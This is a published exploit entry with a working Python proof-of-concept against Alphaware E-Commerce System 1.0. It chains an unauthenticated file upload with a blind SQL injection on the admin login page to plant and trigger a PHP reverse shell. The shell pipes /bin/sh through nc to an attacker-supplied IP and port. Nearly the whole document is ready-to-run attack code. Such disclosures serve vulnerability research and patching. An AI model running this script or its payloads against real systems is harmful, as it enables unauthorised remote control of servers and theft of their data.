# Exploit Title: Alphaware E-Commerce System 1.0 - Unauthenicated Remote Code Execution (File Upload + SQL injection)
# Date: 15-03-2021
# Exploit Author: Christian Vierschilling
# Vendor Homepage: https://www.sourcecodester.com
# Software Link: https://www.sourcecodester.com/php/11676/alphaware-simple-e-commerce-system.html
# Software Download: https://www.sourcecodester.com/download-code?nid=11676&title=Alphaware+-+Simple+E-Commerce+System+using+PHP+with+Source+Code
# Version: 1.0
# Tested on: PHP 7.4.14, Linux x64_x86

# --- Description --- #

# The web application allows for an unauthenticated file upload which can result in a Remote Code Execution.
# We combine this issue with an sql injection to retrieve the randomised name of our uploaded php shell.

# --- Proof of concept --- #

#!/usr/bin/python3
import random
import sys
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

def file_upload(target_ip, attacker_ip, attacker_port):
  random_number = str(random.randint(100000000,999999999))
  file_name = "SHELL.php"
  revshell_string = '<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f"); ?>'.format(attacker_ip, attacker_port)
  m = MultipartEncoder(fields={'add': '', 'product_image': (file_name, revshell_string, 'application/x-php'),'product_code':random_number,'product_name':'R3v_5H3LL','product_price':'123','product_size':'99','brand':'N0_name','category':'Hackers','qty':'1'})
  print("(+) Uploading php reverse shell file ..")
  r1 = requests.post('http://{}/alphaware/admin/admin_football.php'.format(target_ip), data=m, headers={'Content-Type': m.content_type})
  return random_number

def trigger_shell_sqli(target_ip,product_id):
  target_file_name = ''
  url = 'http://{}/alphaware/function/admin_login.php'.format(target_ip)
  print("(+) Now setting up our sqli for file name guessing ..")

  # STEP 1: Get length of target column in database ..
  for i in range(1, 200):
    payload = {'enter':'','username':"' or {}=(select char_length(product_image) from product where product_id = {})#".format(i, product_id)}
    r2 = requests.post(url, data=payload, allow_redirects=False)

    # STEP 2: successful sqli will be indicated by a redirect.. setting up our blind based file name guessing. :-)
    if str(r2.status_code) == '302':
      print("(+) Initial sqli successful, got length of our target file name!")
      print("(+) Now for the filename.. ", end = '')
      for j in range(1, i+1):
        for brutechar in range(32, 126):
          payload = {'enter':'','username':"' or '{}'=(SELECT substring((SELECT product_image from product where product_id = {}),{},1))#".format(chr(brutechar),product_id,j)}
          r3 = requests.post(url, data=payload, allow_redirects=False)
          if str(r3.status_code) == '302':
            target_file_name = target_file_name + chr(brutechar)
            print(chr(brutechar), end = '')
            sys.stdout.flush()
            break

  url = 'http://{}/alphaware/photo/{}.php'.format(target_ip,target_file_name.split('.')[0])
  print("\r\n(+) Trying to trigger shell by requesting {} ..".format(url))
  r4 = requests.get(url)

def main():
  if len(sys.argv) != 4:
    print('(+) usage: %s <target ip> <attacker ip> <attacker port>' % sys.argv[0])
    print('(+) eg: %s 10.0.0.1 10.13.37.10 4444' % sys.argv[0])
    sys.exit(-1)

  target_ip = sys.argv[1]
  attacker_ip = sys.argv[2]
  attacker_port = sys.argv[3]

  product_id = file_upload(target_ip, attacker_ip, attacker_port)
  trigger_shell_sqli(target_ip, product_id)

  print("(+) done!")

if __name__ == "__main__":
  main()